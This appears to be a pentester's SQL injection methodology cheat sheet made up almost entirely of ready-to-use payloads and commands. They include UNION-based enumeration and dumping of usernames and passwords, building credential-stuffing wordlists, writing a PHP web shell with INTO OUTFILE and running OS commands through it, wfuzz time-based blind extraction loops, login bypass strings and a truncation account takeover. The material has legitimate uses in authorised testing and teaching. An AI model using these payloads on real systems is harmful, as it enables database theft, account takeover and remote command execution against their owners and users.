# SQLi Methodology

### 1) Confirmation of a potential SQLi

    ' or 1=1 -- -

Alternatively, you can use BurpSuite Intruder with SQLi wordlists as well.

### 2) Find number of columns in the table

Repeat this input until you get a response from the server

    ' UNION SELECT 1 #
    ' UNION SELECT 1,2 #
    ' UNION SELECT 1,2,3 #
    ' UNION SELECT 1,2,3,4 #
    ' UNION SELECT 1,2,3,4,5 #
    ' UNION SELECT 1,2,3,4,5,6 #

Automated

    wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"

### 3) Find DB Version

    ' UNION SELECT 1,2,3,4,5,@@version #

### 4) Find DB names

    ' union select 1,2,3,4,5,concat(schema_name) FROM information_schema.schemata #

### 5) Find tables names (DB=Users)

    ' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Users' #

SQLite

    ' UNION SELECT name FROM sqlite_master WHERE type='table'-- -

### 6) Find the columns name of a table (Table=User)

    ' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'User' #

SQLite

    ' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='User'-- -

### 7) Dump data (group_concat(username,” | “,password))

    ' union select 1,2,3,4,5,group_concat(username," | ",password) From users.User #

SQLite

    ' UNION SELECT passwd FROM users-- -

### 8) Create wordlists for credential stuffing attacks

    cat creds | tr "," "\n" | cut -d " " -f 1 > user
    cat creds | tr "," "\n" | cut -d " " -f 3 > pass

Another thing to check in an SQLi is RCE capabilities (file write or OS command execution)

### 1) File write

    SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"

### 2) Execute payload on webserver

    https://target.com/webshell.php?cmd=id

## Various triggers for SQLi

### 1) Single Quote

    '

### 2) Double Quote

    "

## Blind SQLi

Determine database name

    for i in $(seq 1 10); do 
      wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
    done > <filename.txt> && grep "0m9" <filename.txt

    # Replace <filename.txt> with the name of the file to store results.
    # Replace 10 in $(seq 1 10) with the estimated length of the database name.
    # The FUZZ keyword is used by wfuzz to iterate through ASCII values.

Determine table name

    for i in $(seq 1 10); do 
      wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
    done > <filename.txt> && grep "0m9" <filename.txt

    # Replace table_name and table_schema with the actual names if targeting specific databases or tables.
    # Adjust LIMIT 0,1 to enumerate multiple tables by changing the first argument of LIMIT.

Determine column name

    for i in $(seq 1 10); do 
      wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; 
    done > <filename.txt> && grep "0m9" <filename.txt

    # Replace <table_name> with the actual table name you are targeting.
    # Adjust LIMIT 0,1 to retrieve column names for different tables.

Extract column content

    for i in $(seq 1 10); do 
      wfuzz -v -c -z range,0-10 -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+"; 
    done > <filename.txt> && grep "0m9" <filename.txt

    # Replace <column_name> with the column you're trying to extract (e.g., username, password).
    # Replace <table_name> with the actual table name.
    # The FUZZ value iterates over possible row entries (use LIMIT FUZZ, 1 to iterate rows).

## Login Bypass

Standard OR-based bypass

    ' OR 1=1 --+

Bypass with LIMIT (useful when multiple entries might be returned)

    ' OR 1=1 LIMIT 1 --+

Bypass by using string comparison (a common trick when numeric bypass fails)

    ' OR 'a'='a --+

Using AND to combine conditions and exploit certain scenarios

    ' OR 3=3 --+

More obfuscated example (avoiding use of typical 1=1):

    ' OR 2=2 --+

Bypass with string comparison (works for both MySQL and MSSQL)

    ' OR 'a'='a' --+

OR-based bypass with a numeric comparison

    ' OR 3=3 --+

Bypass with LIMIT for MySQL (restricts to 1 entry)

    ' OR 1=1 LIMIT 1 --+

MSSQL version of limiting output with TOP

    ' OR 1=1; SELECT TOP 1 * FROM users --+

## SQL Truncation

Truncation-based SQL injection occurs when the database limits user input based on a specified length, discarding any characters beyond that limit. This can be exploited by an attacker to manipulate user data. For example, an attacker can create a new user with a name like 'admin' and their own password, potentially causing multiple entries for the same username. If both entries are evaluated as 'admin', the attacker could gain unauthorized access to the legitimate admin account.

In the following example, the database truncates the username after a certain length (e.g., 10 characters). The attacker uses this to create a conflicting account:

    # Example of truncation; the database discards extra characters
    username=admin++++++++(max.length)&password=testpwn123
    
    -- Assume the database has a 10-character limit on the username field, note that more characters are added because otherwise the truncation won't be made.
    username=admin++++++++&password=testpwn123
    
    -- The database truncates the input to admin and discards the extra characters
    -- If a user admin already exists, the attacker might be able to bypass authentication.
